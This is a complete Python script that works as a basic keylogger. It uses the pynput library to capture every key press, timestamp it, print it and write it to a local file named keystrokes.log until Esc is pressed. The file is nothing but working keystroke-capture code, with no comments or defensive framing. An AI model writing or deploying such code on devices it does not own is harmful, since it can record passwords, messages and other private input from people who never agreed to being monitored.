from pynput import keyboard
import logging
from datetime import datetime

logging.basicConfig(
    filename="keystrokes.log",
    level=logging.DEBUG,
    format="%(message)s"
)

def on_press(key):
    try:
        k = key.char
    except AttributeError:
        k = str(key)

    time_now = datetime.now().strftime("[%Y-%m-%d %H:%M:%S]")
    log_entry = f"{time_now} {k}"
    print(log_entry)  
    logging.info(log_entry)

def on_release(key):
    if key == keyboard.Key.esc:
        return False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
